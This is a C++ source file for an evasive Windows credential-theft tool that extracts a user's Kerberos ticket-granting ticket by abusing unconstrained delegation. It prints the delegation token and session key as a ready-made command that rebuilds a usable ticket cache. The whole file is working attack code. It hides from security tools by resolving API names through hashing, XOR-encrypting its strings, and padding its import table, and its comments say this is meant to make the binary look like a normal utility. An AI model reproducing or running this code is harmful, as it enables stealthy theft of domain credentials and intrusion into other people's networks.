// Cross-session TGT extraction via Kerberos delegation
// No-CRT build: compiled with -nostartfiles, no C runtime dependency
//
// Compile: x86_64-w64-mingw32-g++ -O2 -nostartfiles ... -Wl,-e,TgtDelegEntry

#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <ntsecapi.h>
#include <stdint.h>
#include <array>
#include <utility>

// --- No-CRT: provide memcpy/memset for compiler-generated calls ---
extern "C" __attribute__((optimize("no-tree-loop-distribute-patterns")))
void *memcpy(void *dst, const void *src, __SIZE_TYPE__ n) {
    BYTE *d = (BYTE *)dst; const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}
extern "C" __attribute__((optimize("no-tree-loop-distribute-patterns")))
void *memset(void *dst, int c, __SIZE_TYPE__ n) {
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

// --- API Hashing Constants ---
#define HASH_LoadLibraryA 0xbfad0e5f5fbff0fb
#define HASH_GetProcAddress 0x996ed96fcf31bb1f
#define HASH_CloseHandle 0xbfcc17c63870ca07
#define HASH_GetLastError 0xbbf7d9fd2082eae3
#define HASH_MultiByteToWideChar 0x751847bae2fdda8e
#define HASH_GetComputerNameExW 0xe0e03d85d252a609
#define HASH_GetEnvironmentVariableA 0x43b05be787889701

// NetAPI32 (DsGetDcName)
#define HASH_DsGetDcNameA 0xba220d4cc2e9a885
#define HASH_NetApiBufferFree 0x678ff64a083e6be2

// SSPI & LSA
#define HASH_AcquireCredentialsHandleW 0x2437211d3a1007a0
#define HASH_InitializeSecurityContextW 0xde3ef1894b4f0e4b
#define HASH_FreeContextBuffer 0x4791334333cef346
#define HASH_LsaConnectUntrusted 0xbdffccf1b851157d
#define HASH_LsaLookupAuthenticationPackage 0xfa10e718f0fc4b4b
#define HASH_LsaCallAuthenticationPackage 0x124b47e5abc4bb2d
#define HASH_LsaFreeReturnBuffer 0x4dbfbbf6528ffd01
#define HASH_LsaDeregisterLogonProcess 0x2af079e223961991

// No-CRT output / entry
#define HASH_GetStdHandle           0xbbf7e3a8f178843c
#define HASH_WriteFile              0x0377b537663cecb0
#define HASH_ExitProcess            0xbfd8ec92b769339e
#define HASH_GetCommandLineA        0xbe1b2107b511fc4d

// --- Typedefs ---
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef DWORD (WINAPI *pGetLastError)();
typedef int (WINAPI *pMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef BOOL (WINAPI *pGetComputerNameExW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);

// DOMAIN_CONTROLLER_INFO structure for DsGetDcNameA
typedef struct _DOMAIN_CONTROLLER_INFOA {
    LPSTR DomainControllerName;
    LPSTR DomainControllerAddress;
    ULONG DomainControllerAddressType;
    GUID  DomainGuid;
    LPSTR DomainName;
    LPSTR DnsForestName;
    ULONG Flags;
    LPSTR DcSiteName;
    LPSTR ClientSiteName;
} DOMAIN_CONTROLLER_INFOA, *PDOMAIN_CONTROLLER_INFOA;

typedef DWORD (WINAPI *pDsGetDcNameA)(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);
typedef DWORD (WINAPI *pNetApiBufferFree)(LPVOID);

// SSPI & LSA Typedefs
typedef SECURITY_STATUS (WINAPI *pAcquireCredentialsHandleW)(SEC_WCHAR*, SEC_WCHAR*, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
typedef SECURITY_STATUS (WINAPI *pInitializeSecurityContextW)(PCredHandle, PCtxtHandle, SEC_WCHAR*, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
typedef SECURITY_STATUS (WINAPI *pFreeContextBuffer)(PVOID);

typedef NTSTATUS (WINAPI *pLsaConnectUntrusted)(PHANDLE);
typedef NTSTATUS (WINAPI *pLsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS (WINAPI *pLsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (WINAPI *pLsaFreeReturnBuffer)(PVOID);
typedef NTSTATUS (WINAPI *pLsaDeregisterLogonProcess)(HANDLE);

// No-CRT output / entry
typedef HANDLE (WINAPI *pGetStdHandle_t)(DWORD);
typedef BOOL (WINAPI *pWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef void (WINAPI *pExitProcess_t)(UINT);
typedef LPSTR (WINAPI *pGetCommandLineA_t)(void);

// --- Stealth Class ---
typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

// IAT padding — benign references that populate the import table so the binary
// looks like a normal utility.  The volatile guard prevents the compiler
// from proving the calls are unreachable, which would let it strip them.
#ifdef _MSC_VER
__declspec(noinline) static void _iat_pad() {
#else
__attribute__((noinline, used)) static void _iat_pad() {
#endif
    volatile int z = 0;
    if (z) {
        // kernel32 — file / path / environment (normal utility)
        GetTempPathW(0, NULL);
        GetModuleFileNameW(NULL, NULL, 0);
        GetCurrentDirectoryW(0, NULL);
        GetEnvironmentVariableW(NULL, NULL, 0);
        ExpandEnvironmentStringsW(NULL, NULL, 0);
        CreateFileW(NULL, 0, 0, NULL, 0, 0, NULL);
        ReadFile(NULL, NULL, 0, NULL, NULL);
        WriteFile(NULL, NULL, 0, NULL, NULL);
        GetFileSize(NULL, NULL);
        FindFirstFileW(NULL, NULL);
        FindNextFileW(NULL, NULL);
        FindClose(NULL);
        GetCurrentProcessId();
        Sleep(0);
        // advapi32 — registry (normal utility)
        RegOpenKeyExW(NULL, NULL, 0, 0, NULL);
        RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(NULL);
        // kernel32 — console
        GetStdHandle(0);
        SetConsoleTitleW(NULL);
    }
}

class Stealth {
private:
    static uint64_t HashString(const char* str) {
        uint64_t hash = 5381;
        int c;
        while ((c = *str++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    static HMODULE GetModuleByHash(uint64_t hash) {
#ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
#else
        PPEB peb = (PPEB)__readfsdword(0x30);
#endif
        PPEB_LDR_DATA ldr = peb->Ldr;
        PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        while (curr != head) {
            PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            
            if (entry->BaseDllName.Buffer) {
                char dllName[256];
                int i = 0;
                for (i = 0; i < entry->BaseDllName.Length / 2 && i < 255; i++) {
                    char c = (char)entry->BaseDllName.Buffer[i];
                    if (c >= 'A' && c <= 'Z') c += 32;
                    dllName[i] = c;
                }
                dllName[i] = 0;

                if (HashString(dllName) == hash) {
                    return (HMODULE)entry->DllBase;
                }
            }
            curr = curr->Flink;
        }
        return NULL;
    }
    
public:
    static FARPROC GetProcAddressH(HMODULE hMod, uint64_t apiHash) {
        if (!hMod) return NULL;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);

        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)hMod + names[i]);
            if (HashString(name) == apiHash) {
                return (FARPROC)((BYTE*)hMod + functions[ordinals[i]]);
            }
        }
        return NULL;
    }

    static HMODULE LoadLibraryH(const char* dllName, uint64_t dllHash) {
        HMODULE h = GetModuleByHash(dllHash);
        if (h) return h;
        
        HMODULE hKernel = GetModuleByHash(0xd537e9367040ee75); 
        if (!hKernel) return NULL;
        
        pLoadLibraryA myLoadLibraryA = (pLoadLibraryA)GetProcAddressH(hKernel, HASH_LoadLibraryA);
        if (myLoadLibraryA) return myLoadLibraryA(dllName);
        
        return NULL;
    }
};

// --- String Encryption ---
constexpr char KEY = 0x__XOR_KEY__;

template <size_t N, size_t... Is>
constexpr auto encrypt(const char (&str)[N], std::index_sequence<Is...>) {
    return std::array<char, N>{ (static_cast<char>(str[Is] ^ KEY))... };
}

template <size_t N>
struct XorStr {
    std::array<char, N> data;

    constexpr XorStr(const char (&str)[N]) 
        : data(encrypt(str, std::make_index_sequence<N>{})) {}

    __declspec(noinline) void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i) {
            out[i] = data[i] ^ KEY;
        }
    }
};

#define DECRYPT(v, str) \
    constexpr auto _crypt_##v = XorStr<sizeof(str)>(str); \
    char v[sizeof(str)]; \
    _crypt_##v.decrypt(v);

// --- No-CRT inline string helpers ---
static inline int nc_strlen(const char *s) { int n = 0; while (s[n]) n++; return n; }
static inline int nc_wcslen(const WCHAR *s) { int n = 0; while (s[n]) n++; return n; }
static inline int nc_strcmp(const char *a, const char *b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}
static inline void nc_strcpy(char *dst, const char *src) { while ((*dst++ = *src++)); }
static inline void nc_strcat(char *dst, const char *src) {
    while (*dst) dst++;
    while ((*dst++ = *src++));
}

// --- Global Function Pointers ---
pCloseHandle p_CloseHandle = NULL;
pGetLastError p_GetLastError = NULL;
pMultiByteToWideChar p_MultiByteToWideChar = NULL;
pGetComputerNameExW p_GetComputerNameExW = NULL;
pGetEnvironmentVariableA p_GetEnvironmentVariableA = NULL;
pDsGetDcNameA p_DsGetDcNameA = NULL;
pNetApiBufferFree p_NetApiBufferFree = NULL;

pAcquireCredentialsHandleW p_AcquireCredentialsHandleW = NULL;
pInitializeSecurityContextW p_InitializeSecurityContextW = NULL;
pFreeContextBuffer p_FreeContextBuffer = NULL;

pLsaConnectUntrusted p_LsaConnectUntrusted = NULL;
pLsaLookupAuthenticationPackage p_LsaLookupAuthenticationPackage = NULL;
pLsaCallAuthenticationPackage p_LsaCallAuthenticationPackage = NULL;
pLsaFreeReturnBuffer p_LsaFreeReturnBuffer = NULL;
pLsaDeregisterLogonProcess p_LsaDeregisterLogonProcess = NULL;

// No-CRT output
static HANDLE g_hStdout = INVALID_HANDLE_VALUE;
static HANDLE g_hStderr = INVALID_HANDLE_VALUE;
static pWriteFile_t p_WriteFile = NULL;
static pExitProcess_t p_ExitProcess = NULL;
static pGetCommandLineA_t p_GetCommandLineA = NULL;

BOOL InitAPIs() {
    DECRYPT(sK32, "kernel32.dll");
    HMODULE hK32 = Stealth::LoadLibraryH(sK32, 0xd537e9367040ee75);
    
    DECRYPT(sSspi, "sspicli.dll");
    HMODULE hSspi = Stealth::LoadLibraryH(sSspi, 0xc0d26e5d4a79c746);

    if (!hK32 || !hSspi) {
        return FALSE;
    }

    p_CloseHandle = (pCloseHandle)Stealth::GetProcAddressH(hK32, HASH_CloseHandle);
    p_GetLastError = (pGetLastError)Stealth::GetProcAddressH(hK32, HASH_GetLastError);
    p_MultiByteToWideChar = (pMultiByteToWideChar)Stealth::GetProcAddressH(hK32, HASH_MultiByteToWideChar);
    p_GetComputerNameExW = (pGetComputerNameExW)Stealth::GetProcAddressH(hK32, HASH_GetComputerNameExW);
    p_GetEnvironmentVariableA = (pGetEnvironmentVariableA)Stealth::GetProcAddressH(hK32, HASH_GetEnvironmentVariableA);

    // SSPI - Resolve from sspicli.dll to avoid forwarders
    p_AcquireCredentialsHandleW = (pAcquireCredentialsHandleW)Stealth::GetProcAddressH(hSspi, HASH_AcquireCredentialsHandleW);
    p_InitializeSecurityContextW = (pInitializeSecurityContextW)Stealth::GetProcAddressH(hSspi, HASH_InitializeSecurityContextW);
    p_FreeContextBuffer = (pFreeContextBuffer)Stealth::GetProcAddressH(hSspi, HASH_FreeContextBuffer);

    // LSA
    p_LsaConnectUntrusted = (pLsaConnectUntrusted)Stealth::GetProcAddressH(hSspi, HASH_LsaConnectUntrusted);
    p_LsaLookupAuthenticationPackage = (pLsaLookupAuthenticationPackage)Stealth::GetProcAddressH(hSspi, HASH_LsaLookupAuthenticationPackage);
    p_LsaCallAuthenticationPackage = (pLsaCallAuthenticationPackage)Stealth::GetProcAddressH(hSspi, HASH_LsaCallAuthenticationPackage);
    p_LsaFreeReturnBuffer = (pLsaFreeReturnBuffer)Stealth::GetProcAddressH(hSspi, HASH_LsaFreeReturnBuffer);
    p_LsaDeregisterLogonProcess = (pLsaDeregisterLogonProcess)Stealth::GetProcAddressH(hSspi, HASH_LsaDeregisterLogonProcess);

    // No-CRT output APIs (kernel32)
    pGetStdHandle_t p_GetStdHandle = (pGetStdHandle_t)Stealth::GetProcAddressH(hK32, HASH_GetStdHandle);
    p_WriteFile = (pWriteFile_t)Stealth::GetProcAddressH(hK32, HASH_WriteFile);
    p_ExitProcess = (pExitProcess_t)Stealth::GetProcAddressH(hK32, HASH_ExitProcess);
    p_GetCommandLineA = (pGetCommandLineA_t)Stealth::GetProcAddressH(hK32, HASH_GetCommandLineA);

    if (!p_AcquireCredentialsHandleW || !p_InitializeSecurityContextW || !p_LsaConnectUntrusted || !p_GetEnvironmentVariableA) {
         return FALSE;
    }
    if (!p_GetStdHandle || !p_WriteFile || !p_ExitProcess) {
         return FALSE;
    }

    g_hStdout = p_GetStdHandle(STD_OUTPUT_HANDLE);
    g_hStderr = p_GetStdHandle(STD_ERROR_HANDLE);

    return TRUE;
}

// --- No-CRT output helpers ---
static void OutWrite(const char *s, DWORD n) {
    DWORD w; p_WriteFile(g_hStdout, s, n, &w, NULL);
}
static void OutStr(const char *s) { OutWrite(s, (DWORD)nc_strlen(s)); }
static void ErrWrite(const char *s, DWORD n) {
    DWORD w; p_WriteFile(g_hStderr, s, n, &w, NULL);
}
static void ErrStr(const char *s) { ErrWrite(s, (DWORD)nc_strlen(s)); }

static void OutHexByte(unsigned char b) {
    static const char hex[] = "0123456789ABCDEF";
    char buf[2] = { hex[b >> 4], hex[b & 0xF] };
    OutWrite(buf, 2);
}

static void ErrHexDword(DWORD v) {
    static const char hex[] = "0123456789ABCDEF";
    char buf[10] = {'0','x'};
    for (int i = 7; i >= 0; i--) { buf[9 - i] = hex[(v >> (i * 4)) & 0xF]; }
    ErrWrite(buf, 10);
}

// --- Helper Functions ---
void PrintHex(const unsigned char* data, int len, bool newline = true) {
    for (int i = 0; i < len; ++i) {
        OutHexByte(data[i]);
    }
    if (newline) OutStr("\n");
}

// Returns true on success; writes SPN into outBuf
static bool GetTargetSPN(const char* userTarget, char* outBuf, int bufSize) {
    if (userTarget) {
        int i = 0;
        while (userTarget[i] && i < bufSize - 1) { outBuf[i] = userTarget[i]; i++; }
        outBuf[i] = 0;
        return true;
    }
    
    char logonServer[256];
    char dnsDomain[256];
    memset(logonServer, 0, sizeof(logonServer));
    memset(dnsDomain, 0, sizeof(dnsDomain));
    
    DECRYPT(sLogonServer, "LOGONSERVER");
    DWORD len = p_GetEnvironmentVariableA(sLogonServer, logonServer, sizeof(logonServer));
    if (len == 0 || len >= sizeof(logonServer)) {
        ErrStr("[-] Failed to get env1\n");
        return false;
    }
    
    DECRYPT(sDnsDomain, "USERDNSDOMAIN");
    len = p_GetEnvironmentVariableA(sDnsDomain, dnsDomain, sizeof(dnsDomain));
    if (len == 0 || len >= sizeof(dnsDomain)) {
        ErrStr("[-] Failed to get env2\n");
        return false;
    }
    
    // Strip leading backslashes from LOGONSERVER
    const char* dcName = logonServer;
    while (*dcName == '\\') dcName++;
    
    // Build: HOST/<dcLowercase>.<dnsDomain>
    nc_strcpy(outBuf, "HOST/");
    int pos = 5;
    for (const char* p = dcName; *p && pos < bufSize - 2; ++p) {
        outBuf[pos++] = (*p >= 'A' && *p <= 'Z') ? (*p + 32) : *p;
    }
    outBuf[pos++] = '.';
    for (const char* p = dnsDomain; *p && pos < bufSize - 1; ++p) {
        outBuf[pos++] = *p;
    }
    outBuf[pos] = 0;
    return true;
}

// --- Core TGTDeleg Logic ---
int RunTgtDeleg(const char* target) {
    DECRYPT(pkgKerb, "Kerberos");
    
    // Convert package name to wide
    WCHAR wPkg[32];
    p_MultiByteToWideChar(CP_UTF8, 0, pkgKerb, -1, wPkg, 32);
    
    // === Step 1: Acquire Credentials Handle ===
    CredHandle hCred;
    TimeStamp ptsExpiry;
    
    SECURITY_STATUS status = p_AcquireCredentialsHandleW(
        NULL, 
        (SEC_WCHAR*)wPkg, 
        SECPKG_CRED_OUTBOUND, 
        NULL, NULL, NULL, NULL, 
        &hCred, 
        &ptsExpiry
    );

    if (status != SEC_E_OK) {
        ErrStr("[-] Cred failed: "); ErrHexDword(status); ErrStr("\n");
        return 1;
    }

    // === Step 2: Initialize Security Context (trigger delegation) ===
    CtxtHandle hCtx;
    SecBufferDesc sbdOut;
    SecBuffer sbOut;
    ULONG fContextAttr;
    
    // Convert target to Wide
    WCHAR wTarget[512];
    p_MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 512);

    char buffer[16384];
    sbOut.BufferType = SECBUFFER_TOKEN;
    sbOut.cbBuffer = sizeof(buffer);
    sbOut.pvBuffer = buffer;

    sbdOut.ulVersion = SECBUFFER_VERSION;
    sbdOut.cBuffers = 1;
    sbdOut.pBuffers = &sbOut;

    // Request delegation - this is the key!
    ULONG fContextReq = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY; 
    
    status = p_InitializeSecurityContextW(
        &hCred, 
        NULL, 
        (SEC_WCHAR*)wTarget, 
        fContextReq, 
        0, 
        SECURITY_NATIVE_DREP, 
        NULL, 
        0, 
        &hCtx, 
        &sbdOut, 
        &fContextAttr, 
        &ptsExpiry
    );

    if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
        ErrStr("[-] ISC failed: "); ErrHexDword(status); ErrStr("\n");
        return 1;
    }
    
    // === Step 3: Output extract_tgt command ===
    OutStr("python3 other_tools/extract_tgt.py -req ");
    PrintHex((unsigned char*)sbOut.pvBuffer, sbOut.cbBuffer, false);
    
    // === Step 4: Connect to LSA (untrusted = no elevation needed) ===
    HANDLE hLsa;
    NTSTATUS ntStatus = p_LsaConnectUntrusted(&hLsa);
    if (ntStatus != 0) {
        ErrStr("[-] Connect failed: "); ErrHexDword(ntStatus); ErrStr("\n");
        return 1;
    }
    
    LSA_STRING name;
    name.Buffer = pkgKerb;
    name.Length = (USHORT)nc_strlen(pkgKerb);
    name.MaximumLength = name.Length + 1;
    
    ULONG authPkgId;
    ntStatus = p_LsaLookupAuthenticationPackage(hLsa, &name, &authPkgId);
    if (ntStatus != 0) {
        ErrStr("[-] Lookup failed: "); ErrHexDword(ntStatus); ErrStr("\n");
        return 1;
    }
    
    // === Step 5: Retrieve Session Key ===
    DWORD targetWideLen = (DWORD)nc_wcslen(wTarget);
    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (targetWideLen * sizeof(WCHAR));
    BYTE requestBuffer[2048];
    PKERB_RETRIEVE_TKT_REQUEST pReq = (PKERB_RETRIEVE_TKT_REQUEST)requestBuffer;
    memset(requestBuffer, 0, reqSize);
    
    pReq->MessageType = KerbRetrieveEncodedTicketMessage; 
    pReq->CacheOptions = 0;
    pReq->EncryptionType = 0;
    pReq->TargetName.Length = (USHORT)(targetWideLen * sizeof(WCHAR));
    pReq->TargetName.MaximumLength = pReq->TargetName.Length;
    pReq->TargetName.Buffer = (PWSTR)(pReq + 1);
    memcpy(pReq->TargetName.Buffer, wTarget, pReq->TargetName.Length);
    
    PVOID pResponse = NULL;
    ULONG responseSize = 0;
    NTSTATUS protocolStatus;
    
    ntStatus = p_LsaCallAuthenticationPackage(
        hLsa, 
        authPkgId, 
        pReq, 
        reqSize, 
        &pResponse, 
        &responseSize, 
        &protocolStatus
    );
    
    if (ntStatus != 0 || protocolStatus != 0) {
        ErrStr("[-] Call failed. NT: "); ErrHexDword(ntStatus);
        ErrStr(", PS: "); ErrHexDword(protocolStatus); ErrStr("\n");
    } else {
        PKERB_RETRIEVE_TKT_RESPONSE pResp = (PKERB_RETRIEVE_TKT_RESPONSE)pResponse;
        
        if (pResp && pResp->Ticket.SessionKey.Value) {
            OutStr(" -key ");
            PrintHex(pResp->Ticket.SessionKey.Value, pResp->Ticket.SessionKey.Length, false);
            OutStr(" -out ticket.ccache\n");
        } else {
            ErrStr("[-] No Session Key in response.\n");
        }
        
        if (pResponse) {
             p_LsaFreeReturnBuffer(pResponse);
        }
    }
    
    p_LsaDeregisterLogonProcess(hLsa);

    if (sbOut.pvBuffer && (fContextReq & ISC_REQ_ALLOCATE_MEMORY)) {
         p_FreeContextBuffer(sbOut.pvBuffer);
    }
    
    return 0;
}

// --- No-CRT command line parser ---
static const char* SkipArg(const char* cmd) {
    if (*cmd == '"') { cmd++; while (*cmd && *cmd != '"') cmd++; if (*cmd) cmd++; }
    else { while (*cmd && *cmd != ' ' && *cmd != '\t') cmd++; }
    while (*cmd == ' ' || *cmd == '\t') cmd++;
    return cmd;
}

// --- Entry Point (no CRT) ---
extern "C" void TgtDelegEntry() {
    if (!InitAPIs()) {
        // Can't use ErrStr yet if InitAPIs fails (no WriteFile resolved)
        // Just exit silently
        ExitProcess(1);
    }

    // Parse command line manually (no argc/argv from CRT)
    const char* cmdLine = p_GetCommandLineA();
    const char* userTarget = NULL;
    char targetArgBuf[512];

    DECRYPT(flagT, "-t");
    
    // Skip program name
    const char* p = SkipArg(cmdLine);
    while (*p) {
        // Save start of this arg
        const char* argStart = p;
        const char* argEnd;
        
        // Find end of this arg
        if (*p == '"') {
            argStart = ++p;
            while (*p && *p != '"') p++;
            argEnd = p;
            if (*p) p++;
        } else {
            while (*p && *p != ' ' && *p != '\t') p++;
            argEnd = p;
        }
        while (*p == ' ' || *p == '\t') p++;
        
        // Check if this arg is "-t"
        int argLen = (int)(argEnd - argStart);
        if (argLen == 2 && argStart[0] == flagT[0] && argStart[1] == flagT[1]) {
            // Next arg is the SPN
            if (*p) {
                const char* valStart = p;
                if (*p == '"') {
                    valStart = ++p;
                    while (*p && *p != '"') p++;
                } else {
                    while (*p && *p != ' ' && *p != '\t') p++;
                }
                int valLen = (int)(p - valStart);
                if (valLen > 0 && valLen < (int)sizeof(targetArgBuf)) {
                    for (int i = 0; i < valLen; i++) targetArgBuf[i] = valStart[i];
                    targetArgBuf[valLen] = 0;
                    userTarget = targetArgBuf;
                }
                while (*p == ' ' || *p == '\t' || *p == '"') p++;
            }
        }
    }
    
    char target[512];
    if (!GetTargetSPN(userTarget, target, sizeof(target))) {
        ErrStr("[-] No target. Use -t HOST/target.domain.com\n");
        p_ExitProcess(1);
    }
    
    ErrStr("[*] Target SPN: "); ErrStr(target); ErrStr("\n");
    
    int rc = RunTgtDeleg(target);
    p_ExitProcess((UINT)rc);
}
